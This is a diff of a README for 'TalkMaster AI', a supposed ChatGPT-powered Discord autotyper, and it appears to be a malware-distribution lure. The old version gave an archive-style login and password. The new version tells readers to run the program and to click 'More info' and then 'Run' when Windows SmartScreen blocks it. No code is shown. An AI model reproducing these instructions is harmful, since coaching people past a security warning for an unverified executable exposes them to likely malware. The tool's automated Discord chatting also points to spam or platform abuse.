@@ -1,15 +1,14 @@
 # Discord AutoTyper with ChatGPT - TalkMaster AI
 ![MainIMG](https://i.ibb.co/jwWNGhD/553hh.png)
 
-## Info ℹ️
+## TalkMaster AI Full Setup ℹ️
 
-**🔒 Login: User**
+**Open TalkMaster 1.8**
 
-**🔑 Password: TalkMaster24**
+**If the SmarScreen window pops up, click on "More info" and then click "Run".**
 
-**📅 Date: [Current Date]**
+**Press the "Start" button, and our software's functionality will be fully operational!**
 
-**✅ Status: Fully Functional ✅**
 
 ## Features 🚀
 - Seamlessly chat in Discord channels using advanced AI technology.
@@ -19,4 +18,4 @@
 ## Description ℹ️
 TalkMaster AI is a Discord AutoTyper equipped with ChatGPT, allowing users to engage in authentic conversations while automating various tasks. Perfect for whitelisting and other Discord activities, this tool revolutionizes the way users interact and operate within Discord servers.
 
-## Link to Download | [TalkMaster AI](link_to_download)
+
